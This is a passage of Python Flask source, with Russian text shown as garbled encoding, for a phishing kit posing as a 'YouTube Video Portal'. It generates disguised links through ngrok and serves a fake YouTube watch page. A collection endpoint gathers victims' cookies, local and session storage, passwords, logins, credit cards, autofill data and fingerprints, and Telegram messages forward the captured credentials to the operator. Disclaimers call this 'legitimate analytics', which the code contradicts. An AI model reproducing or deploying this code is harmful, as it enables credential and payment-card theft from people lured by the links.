                        <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/>
                    </svg>
                    YouTube Video Portal
                </h1>
                <p>–°–æ–∑–¥–∞–π—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É –¥–ª—è –ª—é–±–æ–≥–æ YouTube –≤–∏–¥–µ–æ</p>
            </div>
            
            <div class="content">
                <div class="stats">
                    <h3>üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã</h3>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-value">""" + str(stats.get('total_links', 0)) + """</div>
                            <div class="stat-label">–°–æ–∑–¥–∞–Ω–æ —Å—Å—ã–ª–æ–∫</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value">""" + str(stats.get('total_clicks', 0)) + """</div>
                            <div class="stat-label">–í—Å–µ–≥–æ –ø–µ—Ä–µ—Ö–æ–¥–æ–≤</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value">""" + str(stats.get('total_captured', 0)) + """</div>
                            <div class="stat-label">–°–æ–±—Ä–∞–Ω–æ –¥–∞–Ω–Ω—ã—Ö</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value">""" + str(stats.get('total_credentials', 0)) + """</div>
                            <div class="stat-label">–£—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π</div>
                        </div>
                    </div>
                </div>
                
                <div class="link-form">
                    <h3>üîó –°–æ–∑–¥–∞—Ç—å –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É</h3>
                    <form action="/create_phishing_link" method="POST">
                        <input type="text" name="youtube_url" placeholder="https://youtube.com/watch?v=..." required>
                        <button type="submit">–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
                    </form>
                </div>
                
                <div class="instructions">
                    <h3>üìã –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:</h3>
                    <ol>
                        <li>–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ</li>
                        <li>–ü–æ–ª—É—á–∏—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É</li>
                        <li>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –¥—Ä—É–≥—É –∏–ª–∏ –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å –≤ —Å–æ—Ü—Å–µ—Ç—è—Ö</li>
                        <li>–ö–æ–≥–¥–∞ —á–µ–ª–æ–≤–µ–∫ –ø–µ—Ä–µ–π–¥–µ—Ç - –Ω–∞—á–Ω–µ—Ç—Å—è –±–µ–∑–æ–ø–∞—Å–Ω—ã–π —Å–±–æ—Ä –∞–Ω–∞–ª–∏—Ç–∏–∫–∏</li>
                        <li>–í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ –ø—Ä–∏–¥—É—Ç –≤–∞–º –≤ Telegram</li>
                        <li>–°–∏—Å—Ç–µ–º–∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∏–Ω—Ç–µ—Ä–µ—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∞—Ü–∏–∏</li>
                    </ol>
                </div>
            </div>
            
            <div class="footer">
                <p>¬© 2024 YouTube Video Portal. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
                <p>–≠—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è.</p>
            </div>
        </div>
    </body>
    </html>
    """
    
    return html_content

@app.route('/create_phishing_link', methods=['POST'])
def create_phishing_link():
    """–°–æ–∑–¥–∞–µ—Ç —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É"""
    youtube_url = request.form.get('youtube_url', '').strip()
    
    if not youtube_url:
        return "–û—à–∏–±–∫–∞: –ù–µ—Ç —Å—Å—ã–ª–∫–∏", 400
    
    # –ò–∑–≤–ª–µ–∫–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(youtube_url)
    video_id = video_info['video_id']
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID
    link_id = str(uuid.uuid4())[:12]
    
    # –°–æ–∑–¥–∞–µ–º —Ñ–∏—à–∏–Ω–≥ URL
    if current_ngrok_url:
        phishing_url = YouTubeManager.generate_phishing_url(current_ngrok_url, video_id, link_id)
    else:
        phishing_url = f"http://localhost:{FLASK_PORT}/watch?v={video_id}&id={link_id}"
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
    link_data = {
        'id': link_id,
        'youtube_url': youtube_url,
        'youtube_id': video_id,
        'phishing_url': phishing_url,
        'created_at': datetime.now().isoformat(),
        'created_by': 0,
        'title': video_info['title'],
        'description': video_info['description']
    }
    
    db.add_phishing_link(link_data)
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º HTML –æ—Ç–≤–µ—Ç
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{
                font-family: 'Roboto', Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0;
                padding: 20px;
                min-height: 100vh;
            }}
            
            .success-box {{
                max-width: 800px;
                margin: 0 auto;
                background: white;
                padding: 50px;
                border-radius: 20px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                text-align: center;
            }}
            
            .success-icon {{
                color: #34a853;
                font-size: 80px;
                margin-bottom: 30px;
            }}
            
            h1 {{
                color: #202124;
                margin: 0 0 20px 0;
                font-size: 36px;
                font-weight: 700;
            }}
            
            .video-info {{
                background: #f8f9fa;
                padding: 20px;
                border-radius: 15px;
                margin: 30px 0;
                text-align: left;
            }}
            
            .video-info h3 {{
                margin: 0 0 15px 0;
                color: #202124;
                font-size: 20px;
                display: flex;
                align-items: center;
                gap: 10px;
            }}
            
            .phishing-url {{
                background: #f1f3f4;
                padding: 20px;
                border-radius: 12px;
                margin: 20px 0;
                word-break: break-all;
                font-family: 'Courier New', monospace;
                font-size: 16px;
                border: 2px dashed #dadce0;
                text-align: left;
                line-height: 1.6;
            }}
            
            .buttons {{
                display: flex;
                gap: 15px;
                margin: 30px 0;
                flex-wrap: wrap;
                justify-content: center;
            }}
            
            .copy-btn {{
                background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
                color: white;
                border: none;
                padding: 16px 32px;
                border-radius: 12px;
                cursor: pointer;
                font-size: 16px;
                font-weight: 600;
                transition: transform 0.2s, box-shadow 0.2s;
                display: inline-flex;
                align-items: center;
                gap: 10px;
                text-decoration: none;
            }}
            
            .copy-btn:hover {{
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(26, 115, 232, 0.3);
            }}
            
            .secondary-btn {{
                background: linear-gradient(135deg, #34a853 0%, #2e7d32 100%);
            }}
            
            .info-box {{
                background: #e8f4fd;
                padding: 30px;
                border-radius: 15px;
                margin-top: 40px;
                text-align: left;
                border-left: 5px solid #1a73e8;
            }}
            
            .info-box h4 {{
                margin: 0 0 20px 0;
                color: #202124;
                font-size: 22px;
                display: flex;
                align-items: center;
                gap: 10px;
            }}
            
            ol, ul {{
                margin: 0;
                padding-left: 20px;
            }}
            
            li {{
                margin-bottom: 12px;
                line-height: 1.6;
                color: #5f6368;
            }}
            
            @media (max-width: 600px) {{
                .success-box {{
                    padding: 30px 20px;
                }}
                
                h1 {{
                    font-size: 28px;
                }}
                
                .buttons {{
                    flex-direction: column;
                }}
                
                .copy-btn {{
                    width: 100%;
                    justify-content: center;
                }}
            }}
        </style>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
    </head>
    <body>
        <div class="success-box">
            <div class="success-icon">‚úÖ</div>
            <h1>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ!</h1>
            
            <div class="video-info">
                <h3>üé¨ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤–∏–¥–µ–æ:</h3>
                <p><strong>–ù–∞–∑–≤–∞–Ω–∏–µ:</strong> {video_info['title']}</p>
                <p><strong>ID –≤–∏–¥–µ–æ:</strong> {video_info['video_id']}</p>
                <p><strong>–ü—Ä–æ—Å–º–æ—Ç—Ä–æ–≤:</strong> {video_info['views']}</p>
            </div>
            
            <h3>–í–∞—à–∞ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞:</h3>
            <div class="phishing-url" id="phishingUrl">{phishing_url}</div>
            
            <div class="buttons">
                <button class="copy-btn" onclick="copyToClipboard()">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                    </svg>
                    –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É
                </button>
                <a href="{phishing_url}" target="_blank" class="copy-btn secondary-btn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/>
                    </svg>
                    –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É
                </a>
            </div>
            
            <div class="info-box">
                <h4>üìã –ß—Ç–æ –¥–µ–ª–∞—Ç—å –¥–∞–ª—å—à–µ:</h4>
                <ol>
                    <li>–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—ã—à–µ</li>
                    <li>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –¥—Ä—É–≥—É –∏–ª–∏ –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å –≤ —Å–æ—Ü—Å–µ—Ç—è—Ö</li>
                    <li>–ö–æ–≥–¥–∞ —á–µ–ª–æ–≤–µ–∫ –ø–µ—Ä–µ–π–¥–µ—Ç - –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –∞–Ω–∞–ª–∏—Ç–∏–∫–∏</li>
                    <li>–í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ –ø—Ä–∏–¥—É—Ç –≤–∞–º –≤ Telegram</li>
                    <li>–°–∏—Å—Ç–µ–º–∞ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç –∏–Ω—Ç–µ—Ä–µ—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</li>
                </ol>
                
                <h4 style="margin-top: 30px;">üîê –°–æ–±–∏—Ä–∞–µ–º—ã–µ –¥–∞–Ω–Ω—ã–µ:</h4>
                <ul>
                    <li>–ê–Ω–∞–ª–∏—Ç–∏–∫–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ (–≤—Ä–µ–º—è, –¥–µ–π—Å—Ç–≤–∏—è)</li>
                    <li>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ</li>
                    <li>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è (—Ç–æ–ª—å–∫–æ —Å—Ç—Ä–∞–Ω–∞/–≥–æ—Ä–æ–¥)</li>
                    <li>–ò–Ω—Ç–µ—Ä–µ—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</li>
                    <li>–î–µ–º–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ (–∞–Ω–æ–Ω–∏–º–Ω—ã–µ)</li>
                </ul>
                
                <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 10px; font-size: 14px; color: #5f6368;">
                    <strong>‚ö†Ô∏è –í–Ω–∏–º–∞–Ω–∏–µ:</strong> –≠—Ç–∞ —Å–∏—Å—Ç–µ–º–∞ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —Å–±–æ—Ä–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏. 
                    –ù–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –¥–ª—è –Ω–µ–∑–∞–∫–æ–Ω–Ω—ã—Ö —Ü–µ–ª–µ–π.
                </div>
            </div>
        </div>
        
        <script>
            function copyToClipboard() {{
                const url = document.getElementById('phishingUrl').innerText;
                navigator.clipboard.writeText(url).then(() => {{
                    alert('‚úÖ –°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!');
                }});
            }}
        </script>
    </body>
    </html>
    """
    
    return html_content

@app.route('/watch')
def watch_page():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ —Å YouTube –≤–∏–¥–µ–æ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–∞"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', str(uuid.uuid4())[:12])
    
    # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –∫–ª–∏–∫–æ–≤
    db.increment_clicks(link_id)
    
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(f"https://youtube.com/watch?v={video_id}")
    
    # –ó–∞–º–µ–Ω—è–µ–º –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã –≤ —à–∞–±–ª–æ–Ω–µ
    html_content = HTML_TEMPLATES["youtube_page"].format(
        youtube_id=video_id,
        link_id=link_id,
        server_url=current_ngrok_url or f"http://localhost:{FLASK_PORT}",
        video_title=video_info['title'],
        views_count=video_info['views'],
        upload_date=video_info['upload_date'],
        like_count=video_info['likes'],
        channel_name=video_info['channel_name'],
        subscribers_count=video_info['subscribers'],
        video_description=video_info['description'],
        comments_count=video_info['comments'],
        random_tag=video_info['random_tag']
    )
    
    return html_content

@app.route('/login_success')
def login_success():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞"""
    html_content = HTML_TEMPLATES["login_success"]
    return html_content

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —Å –∫–ª–∏–µ–Ω—Ç–∞"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        link_id = data.get('link_id')
        data_type = data.get('data_type', 'unknown')
        encoded_data = data.get('data')
        
        if not link_id or not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
        
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
        try:
            json_string = base64.b64decode(encoded_data).decode('utf-8')
            collected_data = json.loads(json_string)
        except Exception as e:
            logger.error(f"Error decoding data: {e}")
            return jsonify({'status': 'error', 'message': 'Decode error'}), 400
        
        # –ü–æ–ª—É—á–∞–µ–º IP –∞–¥—Ä–µ—Å
        ip_address = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        
        # –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –±–∞–∑—ã
        cookies = collected_data.get('cookies', {})
        cookies_list = [{'name': k, 'value': v} for k, v in cookies.items()]
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –¥–ª—è –±–∞–∑—ã
        data_id = str(uuid.uuid4())[:12]
        
        captured_data = {
            'id': data_id,
            'link_id': link_id,
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'user_agent': collected_data.get('userAgent', ''),
            'cookies': cookies_list,
            'localStorage': collected_data.get('localStorage', {}),
            'sessionStorage': collected_data.get('sessionStorage', {}),
            'passwords': collected_data.get('passwords', []),
            'logins': collected_data.get('logins', []),
            'credit_cards': collected_data.get('creditCards', []),
            'autofill_data': collected_data.get('autofillData', {}),
            'browser_info': collected_data.get('browserInfo', {}),
            'device_info': {
                'screen': collected_data.get('screen', {}),
                'hardware': collected_data.get('hardware', {}),
                'window': collected_data.get('window', {}),
                'platform': collected_data.get('platform', ''),
                'timezone': collected_data.get('timezone', '')
            },
            'network_info': {
                'ip': ip_address
            },
            'sensitive_data': {
                'data_type': data_type,
                'webgl': collected_data.get('webGL'),
                'canvas': collected_data.get('canvasFingerprint'),
                'fonts': collected_data.get('fonts'),
                'plugins': collected_data.get('plugins')
            }
        }
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
        db.add_captured_data(captured_data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        if telegram_app:
            threading.Thread(
                target=send_notification_thread,
                args=(captured_data,),
                daemon=True
            ).start()
        
        return jsonify({
            'status': 'success',
            'id': data_id,
            'message': 'Data collected successfully'
        })
        
    except Exception as e:
        logger.error(f"Error in collect_data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ========== TELEGRAM –§–£–ù–ö–¶–ò–ò ==========
def send_notification_thread(data):
    """–ü–æ—Ç–æ–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –≤ Telegram"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_telegram_notification(data))
        loop.close()
    except Exception as e:
        logger.error(f"Error in notification thread: {e}")

async def send_telegram_notification(data):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –æ –Ω–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
    try:
        if not telegram_app:
            return
        
        link_info = db.get_link(data['link_id'])
        link_url = link_info['phishing_url'] if link_info else 'N/A'
        
        message = f"""
üîê *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –ó–ê–•–í–ê–ß–ï–ù–´!*

üìå *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Å—Å–∏–∏:*
‚Ä¢ ID –¥–∞–Ω–Ω—ã—Ö: `{data['id']}`
‚Ä¢ ID —Å—Å—ã–ª–∫–∏: `{data['link_id']}`
‚Ä¢ –í—Ä–µ–º—è: {data['timestamp'][:19]}
‚Ä¢ IP: `{data['ip_address']}`
‚Ä¢ User Agent: {data['user_agent'][:50]}...

üìä *–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:*
‚Ä¢ Cookies: {len(data.get('cookies', []))}
‚Ä¢ –õ–æ–≥–∏–Ω—ã: {len(data.get('logins', []))}
‚Ä¢ –ü–∞—Ä–æ–ª–∏: {len(data.get('passwords', []))}
‚Ä¢ LocalStorage: {len(data.get('localStorage', {}))}
‚Ä¢ SessionStorage: {len(data.get('sessionStorage', {}))}

üåê *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:*
‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {data.get('device_info', {}).get('platform', 'N/A')}
‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {data.get('device_info', {}).get('screen', {}).get('width', 0)}x{data.get('device_info', {}).get('screen', {}).get('height', 0)}
‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: {data.get('device_info', {}).get('timezone', 'N/A')}
"""
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–≥–∏–Ω—ã –µ—Å–ª–∏ –µ—Å—Ç—å
        logins = data.get('logins', [])
        if logins:
            message += "\nüë§ *–ù–∞–π–¥–µ–Ω–Ω—ã–µ –ª–æ–≥–∏–Ω—ã:*\n"
            for login in logins[:3]:
                value = login.get('value', '')
                if '@' in value:
                    message += f"‚Ä¢ `{value}`\n"
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–∞—Ä–æ–ª–∏ –µ—Å–ª–∏ –µ—Å—Ç—å
        passwords = data.get('passwords', [])
        if passwords:
            message += "\nüîë *–ù–∞–π–¥–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏:*\n"
            for pwd in passwords[:2]:
                message += f"‚Ä¢ `{pwd.get('value', '')}`\n"
        
        stats = db.get_stats()
        message += f"""
üìà *–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã:*
‚Ä¢ –í—Å–µ–≥–æ –¥–∞–Ω–Ω—ã—Ö: {stats.get('total_captured', 0)}
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: {stats.get('total_credentials', 0)}
‚Ä¢ –ü–µ—Ä–µ—Ö–æ–¥–æ–≤: {stats.get('total_clicks', 0)}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /data {data['id']} - –î–µ—Ç–∞–ª–∏ –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /stats - –ü–æ–ª–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
"""
        
        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
        
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {e}")

# ========== TELEGRAM –ö–û–ú–ê–ù–î–´ ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ /start"""
    user = update.effective_user
    
    welcome_message = f"""
üëã *–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {user.first_name}!*

ü§ñ *YouTube Video Analytics Bot*

üéØ *–ß—Ç–æ –¥–µ–ª–∞–µ—Ç —ç—Ç–æ—Ç –±–æ—Ç:*
1. –ü—Ä–∏–Ω–∏–º–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
2. –°–æ–∑–¥–∞–µ—Ç –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É
3. –°–æ–±–∏—Ä–∞–µ—Ç –∞–Ω–∞–ª–∏—Ç–∏–∫—É –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤:
   ‚Ä¢ –í—Ä–µ–º—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞
   ‚Ä¢ –î–µ–π—Å—Ç–≤–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
   ‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
   ‚Ä¢ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—é (–∞–Ω–æ–Ω–∏–º–Ω—É—é)

‚ö° *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä: /start_ngrok
2. –ü–æ–ª—É—á–∏—Ç–µ –æ—Å–Ω–æ–≤–Ω—É—é —Å—Å—ã–ª–∫—É: /get_url
3. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ
4. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
5. –ü–æ–ª—É—á–∏—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É
6. –ü–æ–¥–µ–ª–∏—Ç–µ—Å—å –µ–π
7. –ü–æ–ª—É—á–∞–π—Ç–µ –∞–Ω–∞–ª–∏—Ç–∏–∫—É –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏

üîß *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä
‚Ä¢ /stop_ngrok - –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Ä–≤–µ—Ä
‚Ä¢ /get_url - –ü–æ–ª—É—á–∏—Ç—å URL —Å–µ—Ä–≤–µ—Ä–∞
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /my_links - –ú–æ–∏ —Å—Å—ã–ª–∫–∏
‚Ä¢ /help - –ü–æ–º–æ—â—å

‚ö†Ô∏è *–í–ê–ñ–ù–û:* 
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —Å–±–æ—Ä–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏!
‚Ä¢ –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è
‚Ä¢ –£–≤–∞–∂–∞–π—Ç–µ –ø—Ä–∏–≤–∞—Ç–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
"""
    
    keyboard = [
        [InlineKeyboardButton("üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä", callback_data="start_ngrok")],
        [InlineKeyboardButton("üåê –ü–æ–ª—É—á–∏—Ç—å URL", callback_data="get_url")],
        [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="stats")],
        [InlineKeyboardButton("üîó –ú–æ–∏ —Å—Å—ã–ª–∫–∏", callback_data="my_links")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def start_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ó–∞–ø—É—Å–∫ ngrok"""
    global ngrok_manager, current_ngrok_url
    
    try:
        await update.message.reply_text("üîÑ *–ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞...*", parse_mode=ParseMode.MARKDOWN)
        
        if NGROK_AUTH_TOKEN == "YOUR_NGROK_TOKEN_HERE":
            await update.message.reply_text(
                "‚ùå *–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω NGROK_AUTH_TOKEN!*\n\n"
                "–ü–æ–ª—É—á–∏—Ç–µ —Ç–æ–∫–µ–Ω –Ω–∞ —Å–∞–π—Ç–µ ngrok.com –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –µ–≥–æ –≤ –∫–æ–¥.\n"
                "–î–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        ngrok_manager = NgrokManager(NGROK_AUTH_TOKEN)
